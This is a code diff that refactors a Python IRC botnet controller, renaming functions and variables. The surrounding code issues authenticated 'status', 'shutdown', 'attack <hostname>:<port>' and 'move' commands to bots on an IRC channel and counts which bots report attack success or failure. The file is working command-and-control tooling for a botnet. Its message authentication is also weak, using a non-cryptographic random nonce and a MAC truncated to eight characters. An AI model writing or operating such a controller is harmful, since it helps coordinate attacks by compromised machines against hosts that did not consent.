@@ -10,12 +10,12 @@ from typing import List, Dict, Tuple, Set, Optional, Any, Union
 
 RESPONSE_TIMEOUT = 5
 
-def compute_mac(nonce: str, secret: str) -> str:
+def computeMac(nonce: str, secret: str) -> str:
     combo = nonce + secret
     sha_val = hashlib.sha256(combo.encode('utf-8')).hexdigest()
     return sha_val[:8]
 
-def generate_nonce() -> str:
+def nonceGen() -> str:
     return str(random.randint(100000, 999999))
 
 class IRCController:
@@ -78,10 +78,10 @@ class IRCController:
         if self.socket:
             self.socket.sendall(f"{message}\r\n".encode('utf-8'))
     
-    def send_message(self, message: str) -> None:
+    def sendMsg(self, message: str) -> None:
         self.send(f"PRIVMSG #{self.channel} :{message}")
     
-    def collect_responses(self, timeout: float = RESPONSE_TIMEOUT) -> bool:
+    def get_response(self, timeout: float = RESPONSE_TIMEOUT) -> bool:
         self.responses = []
         start_time = time.time()
         
@@ -134,6 +134,9 @@ class IRCController:
         return True
     
     def run(self) -> None:
+        """
+        Method to start the controller, runs indefinitely
+        """
         if not self.connect():
             print("Could not connect to the IRC server. Exiting.")
             return
@@ -146,8 +149,8 @@ class IRCController:
                 if not cmd:
                     continue
                 
-                parts = cmd.split()
-                command = parts[0].lower()
+                tokens = cmd.split()
+                command = tokens[0].lower()
                 #control logic
                 if command == "quit":
                     print("Disconnected.")
@@ -157,23 +160,23 @@ class IRCController:
                 
                 elif command in ["status", "shutdown", "attack", "move"]:
                     #auth
-                    nonce = generate_nonce()
-                    mac = compute_mac(nonce, self.secret)
+                    nonce = nonceGen()
+                    mac = computeMac(nonce, self.secret)
                     
                     if command in ["attack", "move"]:
-                        if len(parts) < 2:
+                        if len(tokens) < 2:
                             print(f"Error: {command} requires <hostname>:<port>")
                             continue
                         
-                        target = parts[1]
+                        target = tokens[1]
                         message = f"{nonce} {mac} {command} {target}"
                     else:
                         message = f"{nonce} {mac} {command}"
                     
-                    self.send_message(message)
+                    self.sendMsg(message)
                     
                     print("  Waiting 5s to gather replies.")
-                    if not self.collect_responses(RESPONSE_TIMEOUT):
+                    if not self.get_response(RESPONSE_TIMEOUT):
                         print("  Disconnected while waiting for responses.")
                         break
                     
@@ -211,10 +214,10 @@ class IRCController:
         
         for response in self.responses:
             if response.startswith("-status "):
-                parts = response.split()
-                if len(parts) == 3: # "-status", nick, and count
-                    nick = parts[1]
-                    count = parts[2]
+                tokens = response.split()
+                if len(tokens) == 3: # "-status", nick, and count
+                    nick = tokens[1]
+                    count = tokens[2]
                     status_bots.append((nick, count))
         
         print(f"  Result: {len(status_bots)} bots replied.")
@@ -228,9 +231,9 @@ class IRCController:
         
         for response in self.responses:
             if response.startswith("-shutdown "):
-                parts = response.split()
-                if len(parts) == 2:
-                    nick = parts[1]
+                tokens = response.split()
+                if len(tokens) == 2:
+                    nick = tokens[1]
                     shutdown_bots.append(nick)
         
         print(f"  Result: {len(shutdown_bots)} bots shut down.")
@@ -243,15 +246,15 @@ class IRCController:
         
         for response in self.responses:
             if response.startswith("-attack "):
-                parts = response.split(None, 3)
-                if len(parts) >= 3:
-                    nick = parts[1]
-                    result = parts[2]
+                tokens = response.split(None, 3)
+                if len(tokens) >= 3:
+                    nick = tokens[1]
+                    result = tokens[2]
                     
                     if result == "OK":
                         successful[nick] = True
-                    elif result == "FAIL" and len(parts) == 4:
-                        failed[nick] = parts[3]
+                    elif result == "FAIL" and len(tokens) == 4:
+                        failed[nick] = tokens[3]
                     else:
                         failed[nick] = "unknown error"
         
@@ -269,9 +272,9 @@ class IRCController:
         
         for response in self.responses:
             if response.startswith("-move "):
-                parts = response.split()
-                if len(parts) == 2:
-                    nick = parts[1]
+                tokens = response.split()
+                if len(tokens) == 2:
+                    nick = tokens[1]
                     moved_bots.append(nick)
         
         print(f"  Result: {len(moved_bots)} bots moved.")
